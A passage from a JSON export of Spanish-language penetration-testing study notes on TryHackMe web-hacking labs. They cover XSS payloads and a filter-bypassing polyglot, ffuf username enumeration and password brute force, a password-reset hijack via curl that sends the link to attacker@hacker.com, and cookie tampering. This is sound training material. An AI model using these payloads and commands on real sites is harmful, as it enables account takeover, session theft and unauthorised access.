\"value\":\n\n![[Pasted image 20251108213955.png]]\n\nSi intent√°ramos meter aqu√≠ el mismo payload no funcionar√≠a debido a que no se puede ejecutar desde dentro de una etiqueta de input, pero lo que podemos hacer es algo parecido a lo que hacemos en la SQL Injection, cerrar el atributo: `\"><script>alert('THM');</script>`\n\n![[Pasted image 20251108214150.png]]\n\nSi miramos el c√≥digo fuente veremos c√≥mo hemos modificado la p√°gina:\n\n![[Pasted image 20251108214240.png]]\n\n---------------------------------------\n<h2>Nivel 3</h2>\nSe te muestra otro formulario para meter tu nombre, pero ahora se refleja dentro de una etiqueta de √°rea de texto:\n\n![[Pasted image 20251108214541.png]]\n\nSi miramos el c√≥digo fuente vemos c√≥mo est√° introducido:\n\n![[Pasted image 20251108214633.png]]\n\nDebemos hacer algo muy parecido al nivel anterior, salir manualmente de la etiqueta: `</textarea><script>alert('THM');</script>`\n\n![[Pasted image 20251108214739.png]]\n\nSi ahora miramos el c√≥digo fuente:\n\n![[Pasted image 20251108214812.png]]\n\n--------------------------------------\n<h2>Nivel 4</h2>\nMetiendo tu nombre en el formulario, ver√°s c√≥mo se refleja en la p√°gina. Parece similar, pero al inspeccionar la p√°gina, ves que tu nombre sale reflejado en alg√∫n c√≥digo JavaScript.\n\n![[Pasted image 20251108215023.png]]\n\n![[Pasted image 20251108215048.png]]\n\nTendremos que escapar el comando de JavaScript actual para poder correr nuestro c√≥digo, podemos hacer esto con el payload siguiente: `';alert('THM');//`. EL `'` cierra el campo especificando el nombre, `;` termina el comando actual de JavaScript, luego viene nuestro comando, y luego `//` indica que lo que venga despu√©s ser√° un comentario.\n\n![[Pasted image 20251108215319.png]]\n\nSi miramos el c√≥digo fuente:\n\n![[Pasted image 20251108215346.png]]\n\n---------------------------------------\n<h2>Nivel 5</h2>\nEste nivel se ve igual que el nivel 1 y tu nombre tambi√©n se refleja en el mismo sitio, pero si pruebas el payload `<script>alert('THM');</script>` no funcionar√°. Cuando vemos el c√≥digo fuente sale lo siguiente:\n\n![[Pasted image 20251108215652.png]]\n\nVemos que se est√° filtrando la palabra \"script\". Para bypassear esto, introduciremos un payload que cuando se quite la palabra \"script\" quede \"script\" donde lo necesitamos, por ejemplo:\n\n`<sscriptcript>alert('THM');</sscriptcript>`\n\n![[Pasted image 20251108215840.png]]\n\nSi ahora miramos el c√≥digo fuente:\n\n![[Pasted image 20251108215905.png]]\n\n--------------------------------\n<h2>Nivel 6</h2>\nSimilar al nivel 2, donde ten√≠amos que escapar de un atributo \"value\" de una etiqueta de input, podemos probar `\"><script>alert('THM');</script>`, pero no parece funcionar. Miremos el c√≥digo fuente:\n\n![[Pasted image 20251108220121.png]]\n\nVemos que est√° filtrando los s√≠mbolos `<` y `>`. Podemos aprovechar el atributo \"onload\" de la etiqueta \"img\". El evento \"onload\" ejecuta c√≥digo de tu elecci√≥n una vez la imagen especificada en el atributo \"src\" se haya cargado en la p√°gina. \n\nCambiemos el payload a esto: `/images/cat.jpg\" onload=\"alert('THM');` y miramos el c√≥digo fuente:\n\n![[Pasted image 20251108220426.png]]\n\n![[Pasted image 20251108220440.png]]\n\n-------------------------------------\n<h2>Polyglots</h2>\nUn polyglot XSS es una string de texto que puede escapar atributos, etiquetas y bypassear filtros de una sentada. Podr√≠as haber usado el polyglot de aqu√≠ abajo en todos los 6 niveles que acabamos de ver y habr√≠a ejecutado el c√≥digo exitosamente.\n\n``jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('THM')//>\\x3e``",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Blind XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/6-blind-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/6. Blind XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "Una vulnerabilidad Blind XSS es similar a una Stored XSS, solo que en esta no puedes ver c√≥mo funciona por detr√°s y tampoco puedes comprobarlo por ti mismo primero.\n\n------------------------------\n<h2>Escenario de Ejemplo</h2>\nUn sitio web tiene un formulario de contacto donde puedes mandar un mensaje a un miembro del staff. El contenido del mensaje no se comprueba en busca de c√≥digo malicioso, lo que permite al atacante cualquier cosa que quieran. Estos mensajes se vuelven tiquets de soporte que los miembros del staff ven en un portal privado.\n\n----------------------------------------\n<h2>Impacto Potencial</h2>\nUsando el payload correcto, el JavaScript del atacante podr√≠a llamar al servidor o p√°gina web del atacante, revelando la URL del portal de staff, las cookies del staff e incluso contenidos del portal que se est√° viendo. Ahora el atacante podr√≠a secuestrar la sesi√≥n de un miembro del staff y tener la oportunidad de acceder al portal privado.\n\n-----------------------------------\n<h2>Como Comprobar Blind XSS</h2>\nAl testear por Blind XSS, necesitas asegurarte de que tu payload puede llamar (normalmente una petici√≥n HTTP) de vuelta a tu servidor/p√°gina.\n\nUna herramienta popular para comprobar ataques Blind XSS es [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Aunque es posible hacer tu propia herramienta en JavaScript, esta herramienta captura cookies, URLs contenidos de p√°gina, etc autom√°ticamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. DOM Based XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/5-dom-based-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/5. DOM Based XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "<h2>¬øQu√© es el DOM?</h2>\nDOM significa Document Object Model (Modelo de Documento de Objeto) y es una interfaz de programaci√≥n para documentos HTML y XML. Representa la p√°gina para que los programas puedan cambiar la estructura, estilo y contenido del documento. Una p√°gina web es un document, y este documento puede ser mostrado en el navegador tal cual o como fuente HTML. Un diagrama de un DOM HTML es el siguiente:\n\n![[Pasted image 20251107145519.png]]\n\nSi quieres aprender m√°s sobre DOM pulsa [aqu√≠](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html).\n\n----------------------------------------\n<h2>Explotar el DOM</h2>\nEl XSS basado en DOM es cuando la ejecuci√≥n del JavaScript sucede directamente en el buscador sin ninguna nueva p√°gina siendo cargada o informaci√≥n siendo subida al backend. La ejecuci√≥n ocurre cuando el c√≥digo JavaScript de la web act√∫a sobre el input o la interacci√≥n del usuario\n\n-----------------------------------------\n<h2>Escenario de Ejemplo</h2>\nEl JavaScript de la p√°gina web toma su contenido del par√°metro `window.location.hash` y lo escribe en la p√°gina en la secci√≥n actualmente vista. Los contenidos del hash no se comprueban por c√≥digo malicioso, permitiendo al atacante inyectar c√≥digo JavaScript de su elecci√≥n en la p√°gina.\n\n----------------------------------------\n<h2>Impacto Potencial</h2>\nLinks crafteados podr√≠an ser mandados a las potenciales v√≠ctimas, redirigi√©ndolas hacia otro sitio web o robando contenido de su p√°gina o sesi√≥n de usuario.\n\n-------------------------\n<h2>C√≥mo Comprobar XSS Basado en DOM</h2>\nPuede ser dif√≠cil de comprobar y requiere una cierta cantidad de conocimiento de JavaScript para leer el c√≥digo fuente. Necesitar√≠as buscar las partes del c√≥digo que accedan a ciertas variables a las que un atacante podr√≠a tener control, como los par√°metros \"**window.location.x**\".\n\nCuando encuentras esas piezas de c√≥digo, necesitas ver c√≥mo se manejan los valores y si se escriben sobre el DOM de la p√°gina o se pasan a m√©todos inseguros como `eval()`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Stored XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/4-stored-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/4. Stored XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "Como su nombre indica, el payload XSS se guarda en la aplicaci√≥n web (en una base de datos por ejemplo) y se ejecuta cuando otros usuarios visitan la p√°gina o el sitio web.\n\n----------------------------------\n<h2>Escenario de Ejemplo</h2>\nUn blog de un sitio web que permite a los usuarios comentas. Desafortunadamente, estos comentarios no se revisan para ver si contienen JavaScript o c√≥digo malicioso. Si publicamos un comentario que contenga JavaScript, ser√° guardado en la base de datos y cada usuario que visite el art√≠culo cargar√° el JavaScript en su buscador.\n\n![[Pasted image 20251106201028.png]]\n\n--------------------------\n<h2>Impacto Potencial</h2>\nEl c√≥digo JavaScript malicioso podr√≠a redirigir a los usuarios hacia otro sitio web, robar su cookie de sesi√≥n o realizar otras acciones mientras act√∫a como el usuario visitante.\n\n----------------------------------\n<h2>C√≥mo Comprobar Stored XSS</h2>\nNecesitar√°s comprobar cada posible punto de entrada donde parezca que la informaci√≥n puede ser guardada y mostrada:\n\n- Comentarios en un blog.\n- Informaci√≥n del perfil del usuario.\n- Listados web.\n\nA veces los desarrolladores piensan que limitar los valores de input del lado del cliente es suficiente protecci√≥n, as√≠ que cambiar los valores a algo que la aplicaci√≥n web no esperar√≠a es una buena manera de descubrir vulnerabilidades XSS, por ejemplo, un campo de edad que est√° esperando un entero de un men√∫ desplegable pero mandas la petici√≥n manualmente.\n\nUna vez hayas encontrado informaci√≥n que puede ser guardada en la aplicaci√≥n, necesitaras confirmar que puedes correr tu payload JavaScript. Este depender√° de d√≥nde en la aplicaci√≥n se refleje tu c√≥digo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Brute Force",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/4-authentication-bypass/2-brute-force/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/2. Brute Force.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "Usando la lista generada de nombres de usuario v√°lidos en la tarea anterior, podemos usarla para intentar un ataque de fuerza bruta en la p√°gina del `/customers/login`.\n\nLo haremos con el siguiente comando:\n\n```shell\nuser@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d \"username=W1&password=W2\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.7.252/customers/login -fc 200\n```\n\nAntes usamos **FUZZ** como palabra sustitutiva pero como ahora estamos usando varios diccionarios, debemos configurarla nosotros. En este caso hemos elegido `W1` para la primera y `W2` para la segunda. Los m√∫ltiples diccionarios se vuelven a indicar con `-w`. Para una coincidencia positiva usaremos el argumento `-fc` para comprobar el estado HTTP de respuesta.\n\n![[Pasted image 20251103172715.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Username Enumeration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/4-authentication-bypass/1-username-enumeration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/1. Username Enumeration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "Un ejercicio de ayuda para completar al tratar de encontrar vulnerabilidades de autentificaci√≥n es completar una lista de nombres de usuario v√°lidos, que usaremos en otras tareas.\n\nLos mensajes de error web son una buenos recursos para poder construir la lista de nombres de usuario v√°lidos. Tenemos un formulario para crear usuarios en la p√°gina de Acme.\n\nSi tratas de introducir el nombre de usuario **admin**, ver√°s un error diciendo que el nombre de usuario ya existe. Gracias a este error, podemos completar una lista de usuarios ya registrados. La herramienta ffuf usa una lista de nombres de usuario comunes para comprobar coincidencias.\n\n```shell\nuser@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d \"username=FUZZ&email=x&password=x&cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.7.252/customers/signup -mr \"username already exists\"\n```\n\n- `-w`: Selecciona el diccionario.\n- `-X`: Especifica el m√©todo de petici√≥n.\n- `-d`: Especifica la informaci√≥n que vamos a mandar. Hemos puesto **FUZZ** porque en ffuf la palabra FUZZ sirve para sustituirse por las entredas del diccionario.\n- `-H`: Sirve para a√±adir headers adicionales a la petici√≥n.\n- `-u`: Especifica la URL a la que estamos haciendo la petici√≥n.\n- `-mr`: Especifica el texto en la web que estamos buscando para validar nuestros usuarios.\n\nLa herramienta ffuf puede ser descargada, junto con el diccionario desde [aqu√≠](https://github.com/ffuf/ffuf).\n\nCrea una lista con los usuarios que que encuentres con ffuf. La usaremos m√°s adelante.\n\n![[Pasted image 20251103170145.png]]\n\n- admin\n- robert\n- simon\n- steve",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Logic Flaw",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/4-authentication-bypass/3-logic-flaw/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/3. Logic Flaw.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "<h2>¬øQu√© es una Debilidad de L√≥gica?</h2>\nA veces los procesos de autentificaci√≥n contienen fallos de l√≥gica. Esto es cuando el flujo l√≥gico t√≠pico de una aplicaci√≥n es bypasseado, circunvalado o manipulado por un hacker. Los fallos de l√≥gica pueden existir en cualquier parte de la web pero nos vamos a centrar en lo relacionado a la instancia de autentificaci√≥n.\n\n![[Pasted image 20251103174206.png]]\n\n---------------------------\n<h2>Ejemplo de Fallo L√≥gico</h2>\nEl ejemplo de c√≥digo de abajo comprueba si el comienzo de la ruta comienza con `/admin`. Si s√≠, har√° m√°s comprobaciones para ver si el usuario es de verdad el administrador. Si no, muestra la p√°gina al usuario:\n\n```php\nif( url.substr(0,6) === '/admin') {\n    # Code to check user is an admin\n} else {\n    # View Page\n}\n```\n\nGracias a que el c√≥digo PHP de arriba usa tres signos de igualdad (= = =), est√° buscando un match exacto de la string incluyendo may√∫sculas y min√∫sculas. El c√≥digo presenta un fallo l√≥gico porque si un usuario busca `/adMin` no se comprobar√°n sus privilegios y se mostrar√° la p√°gina, bypasseando as√≠ el c√≥digo de verificaci√≥n de autentificaci√≥n.\n\n-----------------------\n<h2>Ejemplo Pr√°ctico de Fallos L√≥gico</h2>\nVamos a examinar la funci√≥n de **Reset Password** en la p√°gina de Acme. Vemos un formulario que pide un email asociado a una cuenta. Si metes un correo err√≥neo ver√°s **\"Account not found from supplied email address**.\n\nVamos a usar el correo **robert@acmeitsupport.t**hm, que s√≠ es aceptado. \n\n![[Pasted image 20251103180001.png]]\n\nPuedes estarte preguntando cual es la vulnerabilidad, si necesitas saber tanto el email del usuario y su nombre y adem√°s el link oara el cambio de contrase√±a se le manda a su correo.\n\nSe requiere ejecutar las siguientes peticiones curl en la m√°quina:\n\n```shell\nuser@tryhackme$ curl 'http://10.10.7.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'\n```\n\n- `-H`: Para a√±adir headers adicionales.\n\nEn la aplicaci√≥n, la cuenta de usuario es recuperada mediante string query pero m√°s tarde en la aplicaci√≥n hay l√≥gica que hace que el email se mande usando la informaci√≥n obtenida de `$_REQUEST`.\n\nEsta variable es un array que contiene informaci√≥n tecibida de la string query en la petici√≥n POST. Si la misma clave de nombre es usada para ambos (la string query y la informaci√≥n POST), si a√±adimos otro par√°metro a la string, podemos decidir a d√≥nde se manda el email de reset.\n\n```shell\nuser@tryhackme$ curl 'http://10.10.7.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'\n```\n\n![[Pasted image 20251103184847.png]]\n\nPara el siguiente paso, necesitas crear una cuenta en Acme. El correo est√° en el formato: \"`{username}`**@customer .acmeitsupport.thm**\".\n\nAhora, reejecutamos la petici√≥n 2 con nuestro email de acme. Tendr√°s un ticket creado en tu sesi√≥n que contiene un link para loguearte como Robert.\n\n```shell\nuser@tryhackme:~$ curl 'http://10.10.7.252/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=**{username}**@customer.acmeitsupport.thm'\n```\n\n1. ![[Pasted image 20251103191348.png]]\n2. ![[Pasted image 20251103191451.png]]\n3. ![[Pasted image 20251103191523.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Authentication Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/4-authentication-bypass/0-authentication-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/0. Authentication Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "[[1. Username Enumeration]]\n[[2. Brute Force]]\n[[3. Logic Flaw]]\n[[4. Cookie Tampering]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Cookie Tampering",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/4-authentication-bypass/4-cookie-tampering/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/4. Cookie Tampering.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "Examinar y editar cookies configuradas por el servior durante tu sesi√≥n online puede tener varios resultados, como acceso no autentificado, acceso a otra cuenta de usuario, o  privilegios elevados.\n\n----------------------------\n<h2>Texto plano</h2>\nLos contenidos de algunas cookies pueden estar en texto plano y es obvio lo que hacen. Toma, por ejemplo, si estas fueran las cookies de sesi√≥n despu√©s de iniciarla:\n\n- **Set-Cookie: logged_in=true;Max-Age=3600; Path=/**\n- **Set-Cookie: admin=false; Max-Age=3600; Path=/**\n\nVemos una cookie (logged_in), que parece controlar si el usuario est√° en su cuenta y otra (admin) que controla si el usuario tiene privilegios admin. Si cambi√°semos los par√°metros e hici√©semos una petici√≥n, podr√≠amos cambiar nuestros privilegios.\n\nEmpezaremos haciendo una petici√≥n a la p√°gina objetivo.\n\n```shell\nuser@tryhackme$ curl http://10.10.232.95/cookie-test\n```\n\nPodemos ver un mensaje de **Not Logged In**.\n\nAhora mandamos otra petici√≥n con la cookie de logged_in configurada en **true**:\n\n```shell\nuser@tryhackme$ curl -H \"Cookie: logged_in=true; admin=false\" http://10.10.232.95/cookie-test\n```\n\nRecibimos el mensaje **Logged In As A User**.\n\nFinalmente mandamos otra con las dos cookies configuradas en **true**:\n\n```shell\nuser@tryhackme$ curl -H \"Cookie: logged_in=true; admin=true\" http://10.10.232.95/cookie-test\n```\n\nRecibimos el mensaje **Logged In As An Admin**.\n\n-----------------------------------\n<h2>Hashing</h2>\nA veces los valores de las cookies pueden verse como una cadena de caracteres random, esto son hashes. Son irreversibles. Aqu√≠ algunos ejemplos:\n\n| **Original String** | **Hash Method** | **Output**                                                                                                                       |\n| ------------------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------- |\n| 1                   | md5             | c4ca4238a0b923820dcc509a6f75849b                                                                                                 |\n| 1                   | sha-256         | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b                                                                 |\n| 1                   | sha-512         | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |\n| 1                   | sha1            | 356a192b7913b04c54574d18c28d46e6395428ab                                                                                         |\n\n-------------------------------\n<h2>Encoding</h2>\nEncodear es similar a hashear solo que s√≠ es reversible. Pero entonces, ¬øpara qu√© sirve? Nos permite transmitir informaci√≥n binaria en texto legible por humanos de forma segura a trav√©s de la red.\n\n**Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ= =; Max-Age=3600; Path=/*\n\nEl valor de esa string en base64 es **{\"id\":1,\"admin\": false}**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Command Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/0-command-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/0. Command Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/1. Introduction]]\n[[2. Discovering Command Injection]]\n[[3. Exploiting Command Injection]]\n[[4. Remediating Command Injection]]\n[[5. Practical - Command Injection (Deploy)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
    "content": "En esta unidad vamos a ver la vulnerabilidad web de Inyecci√≥n de Comandos. Una vez entendamos lo que es, veremos el impacto y riesgo de esta en una aplicaci√≥n.\n\nLuego pondr√°s tus conocimientos en pr√°ctica.\n\n- C√≥mo descubrir vulnerabilidades de inyecci√≥n de comandos.\n- C√≥mo comprobar y explotar esta vulnerabilidad usando payloads dise√±ados para diferentes sistemas operativos.\n- C√≥mo prevenir esta vulnerabilidad en una aplicaci√≥n.\n- Finalmente, aplicar√°s la teor√≠a en una pr√°ctica de aprendizaje.\n\nPara comenzar, entendamos qu√© es  una inyecci√≥n de comandos. Es el abuso del comportamiento de una aplicaci√≥n web para ejecutar comandos en su sistema operativo, usando los mismos privilegios que tiene la aplicaci√≥n.\n\nLa inyecci√≥n de comandos tambi√©n suele conocerse como RCE (Remote Command Execution; Ejecuci√≥n Remota de Comandos) por su habilidad de ejecutar c√≥digo en la aplicaci√≥n de forma remota.\n\nPor ejemplo, ser capaz de ejecutar el comando `whoami` para listar la cuenta de usuario desde la que est√° corriendo el servicio web.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Remediating Command Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/4-remediating-command-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/4. Remediating Command Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
    "content": "Se puede prevenir la inyecci√≥n de comandos de varias maneras. Desde uso m√≠nimo de librer√≠as potencialmente peligrosas hasta filtrar el input del usuario. Los ejemplos de abajo est√°n basados en PHP, sin embargo, se puede extrapolar a muchos otros lenguajes.\n\n-----------------------------\n<h2>Funciones Vulnerables</h2>\nEn PHP hay muchas funciones que interact√∫an con el sistema operativo para ejecutar comandos v√≠a shell. Estos incluyen:\n\n- Exec\n- Passthru\n- System\n\nToma la siguiente traza como ejemplo. La aplicaci√≥n s√≥lo aceptar√° y procesar√° n√∫meros que se metan en el formulario. Esto significa que cualquier comando como `whoami` no ser√° procesado.\n\n![[Pasted image 20251113170732.png]]\n\n1. La aplicaci√≥n s√≥lo aceptar√° un patr√≥n de caracteres espec√≠fico.\n2. La aplicaci√≥n s√≥lo proceder√° a ejecutar esta informaci√≥n que es num√©rica.\n\nEstas funciones toman un input y lo ejecutan en el sistema. Cualquier aplicaci√≥n que use estas funciones sin las comprobaciones correspondientes ser√° vulnerable a la inyecci√≥n de comandos.\n\n---------------------------\n<h2>Sanitizaci√≥n del Input</h2>\nSanitizar el input de un usuario que la aplicaci√≥n usa es una manera genial de prevenir la inyecci√≥n de comandos. Este es el proceso de especificar el formato o tipos de dato que el usuario puede subir. Por ejemplo un campo de input que s√≥lo acepte datos num√©ricos o elimine cualquier car√°cter especial como `>`, `&` y `/`.\n\nEn la traza de debajo, la funci√≥n de PHP `filter_input` se usa para comprobar si alg√∫n dato subido es un n√∫mero o no.Si no lo es lo clasifica de inv√°lido.\n\n![[Pasted image 20251113171224.png]]\n\n------------------------------\n<h2>Bypassear Filtros</h2>\nLa aplicaciones usar√°n numerosas t√©cnicas para filtrar y sanitizar el input del usuario. Estos filtros restringir√°n tus opciones de payload. Sin embargo, podemos abusar la l√≥gica detr√°s de la aplicaci√≥n para sobrepasar estos filtros. Por ejemplo, puede que una aplicaci√≥n elimine el s√≠mbolo `\"`. Pero podemos tratar de usar el valor hexadecimal para conseguir el mismo resultado.\n\nAl ejecutarse, aunque la informaci√≥n dada est√° en un formato diferente al esperado, puede seguir siendo interpretado y tendr√° el mismo resultado.\n\n![[Pasted image 20251113171554.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Discovering Command Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/2-discovering-command-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/2. Discovering Command Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
    "content": "Esta vulnerabilidad existe porque las aplicaciones normalmente usan funciones en lenguajes de programaci√≥n como PHP, Python y Node JS para pasar informaci√≥n y hacer llamadas al sistema en el sistema operativo de la m√°quina que los hostea. Por ejemplo, tomando input de un campo y busc√°ndolo dentro de un archivo. Toma el c√≥digo de abajo como ejemplo.\n\nEn este fragmento de c√≥digo, la aplicaci√≥n toma la informaci√≥n que introduce el usuario en un campo llamado `$title` para buscarlo en un directorio por \"song title\". Desmenuc√©moslo:\n\n![[Pasted image 20251112213901.png]]\n\n1. La aplicaci√≥n guarda archivos MP3 en un directorio contenido en el sistema operativo.\n2. El usuario introduce el t√≠tulo de la canci√≥n que desea buscar. La aplicaci√≥n guarda el input en una variable `$title`.\n3. La informaci√≥n contenida en `$title` se pasa al comando `grep` para buscar un archivo que se llame como el nombre de la canci√≥n introducido.\n4. El output de la b√∫squeda determinar√° si la aplicaci√≥n informa al usuario de que la aplicaci√≥n existe o de que no.\n\nEste tipo de informaci√≥n estar√≠a normalmente guardada en una base de datos. Sin embargo, esto es s√≥lo un ejemplo de c√≥mo una aplicaci√≥n toma el input de un usuario para interactuar con el sistema operativo de la app.\n\nUn atacante podr√≠a abusar esta aplicaci√≥n inyectando sus propios comandos para que la aplicaci√≥n los ejecute. En vez de usar `grep` para buscar el t√≠tulo de una canci√≥n, podr√≠an decirle a la app que mostrase cierta informaci√≥n sensible. No importa en qu√© lenguaje se haga. Mientras la aplicaci√≥n procese y ejecute el input, puede resultar en una inyecci√≥n de comandos.\n\n![[Pasted image 20251113151627.png]]\n\nNo tienes que entender el programa, lo hemos subrayado para explicarte el flujo y que lo comprendas:\n\n1. El paquete \"flask\" se usa para configurar un servidor web.\n2. Una funci√≥n usa el paquete \"subprocess\" para ejecutar comandos en el dispositivo.\n3. Usamos una ruta en el servidor web que ejecutar√° lo que se le de. Por ejemplo, para ejecutar `whoami` tendr√≠amos que visitar `http://flaskapp.thm/whoami`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Exploiting Command Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/3-exploiting-command-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/3. Exploiting Command Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
